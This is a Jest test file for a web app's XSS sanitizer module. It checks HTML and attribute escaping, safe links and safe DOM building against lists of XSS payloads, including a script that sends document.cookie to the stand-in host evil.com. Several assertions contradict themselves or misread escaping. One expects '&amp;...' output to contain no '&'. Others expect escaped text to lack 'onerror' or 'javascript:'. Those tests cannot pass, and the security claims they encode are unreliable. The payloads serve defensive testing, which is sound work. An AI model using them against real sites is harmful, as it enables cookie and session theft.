/**
 * Tests for Sanitizer Module - XSS Prevention
 *
 * Critical security tests for:
 * - escapeHtml(): HTML entity escaping
 * - escapeAttr(): Attribute value escaping
 * - setTextContent(): Safe DOM text manipulation
 * - createSafeLink(): Safe hyperlink creation
 * - createElement(): Safe element creation
 */

// Mock DOM environment
const { JSDOM } = require('jsdom');

// Setup global document
const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>');
global.document = dom.window.document;
global.Element = dom.window.Element;

// Import sanitizer (we need to evaluate it since it's an IIFE)
const fs = require('fs');
const path = require('path');
const sanitizerCode = fs.readFileSync(
  path.join(__dirname, '../../static/js/modules/sanitizer.js'),
  'utf8'
);

// Evaluate sanitizer in a way that captures the module
let sanitizer;
eval(sanitizerCode);
// sanitizer is now available from the IIFE

describe('Sanitizer Module - XSS Prevention', () => {

  describe('escapeHtml()', () => {
    test('escapes basic HTML entities', () => {
      expect(sanitizer.escapeHtml('<script>')).toBe('&lt;script&gt;');
      expect(sanitizer.escapeHtml('&test')).toBe('&amp;test');
      expect(sanitizer.escapeHtml('"quotes"')).toBe('&quot;quotes&quot;');
    });

    test('prevents script injection', () => {
      const malicious = '<script>alert("xss")</script>';
      const escaped = sanitizer.escapeHtml(malicious);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toBe('&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;');
    });

    test('handles event handler injection attempts', () => {
      const malicious = '<img src=x onerror="alert(\'xss\')">';
      const escaped = sanitizer.escapeHtml(malicious);

      expect(escaped).not.toContain('onerror=');
      expect(escaped).toContain('&lt;img');
    });

    test('handles javascript: URL injection', () => {
      const malicious = '<a href="javascript:alert(1)">click</a>';
      const escaped = sanitizer.escapeHtml(malicious);

      expect(escaped).not.toContain('javascript:');
      expect(escaped).toContain('&lt;a');
    });

    test('preserves safe content', () => {
      const safe = 'Hello World';
      expect(sanitizer.escapeHtml(safe)).toBe(safe);
    });

    test('preserves Japanese characters', () => {
      const japanese = '田中太郎';
      expect(sanitizer.escapeHtml(japanese)).toBe(japanese);
    });

    test('handles empty string', () => {
      expect(sanitizer.escapeHtml('')).toBe('');
    });

    test('handles null', () => {
      expect(sanitizer.escapeHtml(null)).toBe('');
    });

    test('handles undefined', () => {
      expect(sanitizer.escapeHtml(undefined)).toBe('');
    });

    test('handles numbers', () => {
      expect(sanitizer.escapeHtml(123)).toBe('123');
    });

    test('escapes all dangerous characters', () => {
      const dangerous = '&<>"\'/';
      const escaped = sanitizer.escapeHtml(dangerous);

      expect(escaped).toBe('&amp;&lt;&gt;&quot;&#39;&#x2F;');
      expect(escaped).not.toContain('&');
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
    });

    test('handles mixed content', () => {
      const mixed = 'User: <b>John</b> & "Admin"';
      const escaped = sanitizer.escapeHtml(mixed);

      expect(escaped).toBe('User: &lt;b&gt;John&lt;&#x2F;b&gt; &amp; &quot;Admin&quot;');
    });
  });

  describe('escapeAttr()', () => {
    test('escapes attribute values', () => {
      expect(sanitizer.escapeAttr('" onclick="alert(1)"')).not.toContain('"');
    });

    test('handles empty string', () => {
      expect(sanitizer.escapeAttr('')).toBe('');
    });

    test('handles null', () => {
      expect(sanitizer.escapeAttr(null)).toBe('');
    });

    test('escapes quotes in attribute', () => {
      const malicious = 'value" onmouseover="alert(1)';
      const escaped = sanitizer.escapeAttr(malicious);

      expect(escaped).not.toContain('" ');
      expect(escaped).toContain('&quot;');
    });

    test('escapes single quotes', () => {
      const malicious = "value' onclick='alert(1)";
      const escaped = sanitizer.escapeAttr(malicious);

      expect(escaped).toContain('&#39;');
    });
  });

  describe('setTextContent()', () => {
    test('sets text content safely', () => {
      const elem = document.createElement('div');
      sanitizer.setTextContent(elem, '<script>alert("xss")</script>');

      expect(elem.innerHTML).not.toContain('<script>');
      expect(elem.textContent).toBe('<script>alert("xss")</script>');
    });

    test('handles null element', () => {
      // Should not throw
      expect(() => sanitizer.setTextContent(null, 'test')).not.toThrow();
    });

    test('converts non-string to string', () => {
      const elem = document.createElement('div');
      sanitizer.setTextContent(elem, 123);

      expect(elem.textContent).toBe('123');
    });

    test('handles null text', () => {
      const elem = document.createElement('div');
      sanitizer.setTextContent(elem, null);

      expect(elem.textContent).toBe('');
    });

    test('prevents DOM clobbering', () => {
      const elem = document.createElement('div');
      const malicious = '<img src=x name="innerHTML">';

      sanitizer.setTextContent(elem, malicious);

      // Text should be set as text, not parsed as HTML
      expect(elem.textContent).toBe(malicious);
      expect(elem.children.length).toBe(0);
    });
  });

  describe('createSafeLink()', () => {
    test('creates safe link element', () => {
      const link = sanitizer.createSafeLink('Click me', '/safe-url');

      expect(link.tagName).toBe('A');
      expect(link.textContent).toBe('Click me');
      expect(link.getAttribute('href')).toBe('/safe-url');
    });

    test('blocks javascript: URLs', () => {
      const link = sanitizer.createSafeLink('Evil', 'javascript:alert(1)');

      expect(link.getAttribute('href')).toBe('#');
    });

    test('blocks data: URLs', () => {
      const link = sanitizer.createSafeLink('Evil', 'data:text/html,<script>alert(1)</script>');

      expect(link.getAttribute('href')).toBe('#');
    });

    test('allows relative URLs', () => {
      const link = sanitizer.createSafeLink('Page', '/page');

      expect(link.getAttribute('href')).toBe('/page');
    });

    test('allows https URLs', () => {
      const link = sanitizer.createSafeLink('External', 'https://example.com');

      expect(link.getAttribute('href')).toBe('https://example.com');
    });

    test('escapes link text', () => {
      const link = sanitizer.createSafeLink('<script>alert(1)</script>', '/safe');

      expect(link.innerHTML).not.toContain('<script>');
      expect(link.textContent).toBe('<script>alert(1)</script>');
    });

    test('handles empty URL', () => {
      const link = sanitizer.createSafeLink('Click', '');

      expect(link.getAttribute('href')).toBe('');
    });
  });

  describe('createElement()', () => {
    test('creates element with safe attributes', () => {
      const elem = sanitizer.createElement('div', {
        id: 'test',
        class: 'my-class'
      });

      expect(elem.tagName).toBe('DIV');
      expect(elem.id).toBe('test');
      expect(elem.className).toBe('my-class');
    });

    test('escapes malicious attribute values', () => {
      const elem = sanitizer.createElement('div', {
        id: '" onclick="alert(1)',
      });

      // Attribute should be escaped
      expect(elem.getAttribute('id')).not.toContain('" ');
    });

    test('sets text content safely', () => {
      const elem = sanitizer.createElement('p', {}, '<script>alert(1)</script>');

      expect(elem.innerHTML).not.toContain('<script>');
      expect(elem.textContent).toBe('<script>alert(1)</script>');
    });

    test('handles null attributes', () => {
      const elem = sanitizer.createElement('div', {
        id: null,
        class: 'valid'
      });

      expect(elem.hasAttribute('id')).toBe(false);
      expect(elem.className).toBe('valid');
    });

    test('handles undefined attributes', () => {
      const elem = sanitizer.createElement('div', {
        id: undefined,
        class: 'valid'
      });

      expect(elem.hasAttribute('id')).toBe(false);
    });
  });

  describe('sanitizeInput()', () => {
    test('sanitizes user input', () => {
      const result = sanitizer.sanitizeInput('<script>alert(1)</script>');

      expect(result).not.toContain('<script>');
    });

    test('is alias for escapeHtml', () => {
      const input = '<div>"test"</div>';
      expect(sanitizer.sanitizeInput(input)).toBe(sanitizer.escapeHtml(input));
    });
  });

  describe('createSafeToast()', () => {
    test('creates toast with escaped message', () => {
      const toast = sanitizer.createSafeToast('<script>alert(1)</script>', 'error');

      expect(toast.tagName).toBe('DIV');
      expect(toast.textContent).toBe('<script>alert(1)</script>');
      expect(toast.innerHTML).not.toContain('<script>');
      expect(toast.className).toContain('toast-error');
    });

    test('escapes toast type in class', () => {
      const toast = sanitizer.createSafeToast('message', '" onclick="alert(1)');

      expect(toast.className).not.toContain('onclick');
    });
  });

  describe('createSafeTableCell()', () => {
    test('creates TD with escaped text', () => {
      const cell = sanitizer.createSafeTableCell('<script>alert(1)</script>');

      expect(cell.tagName).toBe('TD');
      expect(cell.textContent).toBe('<script>alert(1)</script>');
      expect(cell.innerHTML).not.toContain('<script>');
    });

    test('creates TH when isHeader is true', () => {
      const cell = sanitizer.createSafeTableCell('Header', true);

      expect(cell.tagName).toBe('TH');
    });
  });

  describe('createSafeDataGrid()', () => {
    test('creates grid with escaped values', () => {
      const data = {
        name: '<script>alert(1)</script>',
        value: 'safe'
      };

      const grid = sanitizer.createSafeDataGrid(data);

      expect(grid.innerHTML).not.toContain('<script>');
      expect(grid.textContent).toContain('<script>');
    });

    test('handles empty data', () => {
      const grid = sanitizer.createSafeDataGrid({});

      expect(grid.children.length).toBe(0);
    });

    test('respects key filter', () => {
      const data = { a: '1', b: '2', c: '3' };
      const grid = sanitizer.createSafeDataGrid(data, ['a', 'c']);

      expect(grid.textContent).toContain('a');
      expect(grid.textContent).toContain('c');
      expect(grid.textContent).not.toContain('b');
    });
  });

  describe('createSafeTable()', () => {
    test('creates table with escaped values', () => {
      const rows = [
        { name: '<script>alert(1)</script>', value: '10' }
      ];
      const table = sanitizer.createSafeTable(rows, ['name', 'value']);

      expect(table.tagName).toBe('TABLE');
      expect(table.innerHTML).not.toContain('<script>');
    });

    test('creates headers when columns provided', () => {
      const rows = [{ col1: 'a', col2: 'b' }];
      const table = sanitizer.createSafeTable(rows, ['col1', 'col2']);

      expect(table.querySelector('thead')).not.toBeNull();
      expect(table.querySelectorAll('th').length).toBe(2);
    });

    test('handles empty rows', () => {
      const table = sanitizer.createSafeTable([], ['col1']);

      expect(table.querySelector('tbody').children.length).toBe(0);
    });

    test('handles null values in rows', () => {
      const rows = [{ name: null, value: undefined }];
      const table = sanitizer.createSafeTable(rows, ['name', 'value']);

      expect(table.textContent).toContain('-');
    });
  });

});

describe('XSS Attack Vectors', () => {
  describe('Script injection attacks', () => {
    const attacks = [
      '<script>alert(1)</script>',
      '<SCRIPT>alert(1)</SCRIPT>',
      '<script src="evil.js"></script>',
      '<script>document.location="evil.com?c="+document.cookie</script>',
      '</script><script>alert(1)</script>',
    ];

    attacks.forEach(attack => {
      test(`blocks: ${attack.substring(0, 50)}...`, () => {
        const escaped = sanitizer.escapeHtml(attack);
        expect(escaped).not.toContain('<script');
        expect(escaped).not.toContain('</script');
      });
    });
  });

  describe('Event handler attacks', () => {
    const attacks = [
      '<img src=x onerror=alert(1)>',
      '<body onload=alert(1)>',
      '<div onclick=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<svg onload=alert(1)>',
    ];

    attacks.forEach(attack => {
      test(`blocks: ${attack}`, () => {
        const escaped = sanitizer.escapeHtml(attack);
        expect(escaped).not.toContain('onerror');
        expect(escaped).not.toContain('onload');
        expect(escaped).not.toContain('onclick');
        expect(escaped).not.toContain('onfocus');
      });
    });
  });

  describe('URL-based attacks', () => {
    const attacks = [
      'javascript:alert(1)',
      'JAVASCRIPT:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
    ];

    attacks.forEach(attack => {
      test(`blocks link with: ${attack}`, () => {
        const link = sanitizer.createSafeLink('click', attack);
        expect(link.getAttribute('href')).toBe('#');
      });
    });
  });

  describe('Encoding bypass attempts', () => {
    const attacks = [
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '&lt;script&gt;alert(1)&lt;/script&gt;',
      '\x3cscript\x3ealert(1)\x3c/script\x3e',
    ];

    attacks.forEach(attack => {
      test(`handles encoded: ${attack.substring(0, 30)}...`, () => {
        // Even if already encoded, escapeHtml should handle it
        const escaped = sanitizer.escapeHtml(attack);
        // Should not double-decode and execute
        expect(typeof escaped).toBe('string');
      });
    });
  });
});
